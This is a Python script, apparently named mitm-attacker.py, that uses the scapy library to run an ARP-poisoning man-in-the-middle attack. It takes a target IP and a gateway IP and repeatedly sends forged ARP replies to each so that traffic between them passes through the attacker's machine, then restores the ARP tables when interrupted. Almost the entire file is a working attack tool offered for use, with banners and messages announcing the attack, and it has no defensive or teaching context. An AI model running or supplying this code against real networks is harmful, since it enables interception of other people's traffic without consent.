import scapy.all as scapy
import optparse
import time

class Banners:
    ERROR = """
    ▒█▀▀▀ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ █ 
    ▒█▀▀▀ ▒█▄▄▀ ▒█▄▄▀ ▒█░░▒█ ▒█▄▄▀ ▀ 
    ▒█▄▄▄ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▄
    """

    LOGO = """
    ▒█▀▀█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▄ ▒█▀▀▀ ▒█░░▒█ 
    ▒█▀▀▄ ▒█░▒█ ▒█▄▄▀ ▒█░▒█ ▒█▀▀▀ ░▒█▒█░ 
    ▒█▄▄█ ░▀▀█▄ ▒█░▒█ ▒█▄▄▀ ▒█▄▄▄ ░░▀▄▀░
    """

def get_user_input():
    parse_object = optparse.OptionParser(description="This application was developed by bqrdev.",usage="python mitm-attacker.py -t [Target IP] -g [Gateway IP]")
    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("You must specify the Target IP for the attack to start.")
    if not options.gateway_ip:
        print("You must specify the Gateway IP for the attack to start.")
    return options

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=5)

if __name__ == "__main__":
    print(Banners.LOGO)
    number = 0
    user_ips = get_user_input()
    user_target_ip = user_ips.target_ip
    user_gateway_ip = user_ips.gateway_ip
    try:
        print("The attack is being launched!")
        while True:
            time.sleep(2)
            arp_poisoning(user_target_ip, user_gateway_ip)
            arp_poisoning(user_gateway_ip, user_target_ip)
            number += 1
            print(f"\n\rPackages are being sent from address {user_target_ip} to address {user_gateway_ip} ==> " + f"Number of packages {str(number)}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nEverything is being restored to its former state.")
        reset_operation(user_target_ip, user_gateway_ip)
        reset_operation(user_gateway_ip, user_target_ip)
        print("Exiting.")
        time.sleep(1)
    except IndexError:
        print("\nYou entered the wrong value.")
        print("Exiting.")
        time.sleep(1)
else:
    print(Banners.ERROR)
